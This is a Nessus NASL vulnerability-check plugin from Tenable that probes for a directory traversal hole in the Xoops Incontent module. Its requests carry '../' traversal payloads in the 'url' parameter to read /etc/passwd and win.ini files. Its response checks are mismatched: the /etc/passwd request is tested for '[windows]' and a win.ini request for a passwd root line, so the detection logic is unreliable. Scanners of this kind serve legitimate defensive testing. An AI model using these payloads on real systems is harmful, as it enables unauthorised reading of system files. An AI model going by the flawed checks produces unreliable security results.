#
# This script was written by Tenable Network Security
#

if(description)
{
 script_id(16282);
 script_bugtraq_id(12406); 
 script_version ("$Revision: 1.2 $");

 name["english"] = "Xoops Incontent Module Directory Traversal Vulnerability";

 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running Xoops,a web portail written in PHP.Xoops
Incontent module is also installed.

The remote version of Incontent module is prone to a directory
traversal vulnerability in the way it handles 'url' in the file
'index.php'.

An attacker, exploiting this flaw, would be able to access sensitive
files on the remote host like /etc/passwd.

Solution: Incontent is no longer maintened. Upgrade to iContent.

Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the presence of Xoops Incontent module";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "httpver.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

function check(loc)
{
 req1 = http_get(item:string(loc, "/modules/incontent/index.php?op=aff&option=0&url=../../../../../../../../../../../etc/passwd"), port:port);

 req2 = http_get(item:string(loc, "/modules/incontent/index.php?op=aff&option=0&url=../../../../../../../../../../../windows/win.ini"), port:port);

 req3 = http_get(item:string(loc, "/modules/incontent/index.php?op=aff&option=0&url=../../../../../../../../../../../winnt/win.ini"), port:port);

 r = http_keepalive_send_recv(port:port, data:req1);
 if( r == NULL ) return(0);
 
 if("[windows]" >< r){
 	security_hole(port);
	return(0);
	}
	
 r = http_keepalive_send_recv(port:port, data:req2);
 if( r == NULL ) exit(0);
 
 if("[fonts]" >< r){
 	security_hole(port);
	return(0);
	}
	
  r = http_keepalive_send_recv(port:port, data:req3);
  if( r == NULL ) exit(0);
  
  if(egrep(pattern:".*root:.*:0:[01]:.*", string:r)){
  	security_hole(port);
	return(0);
  }
}

foreach dir (cgi_dirs())
{
 check(loc:dir);
}

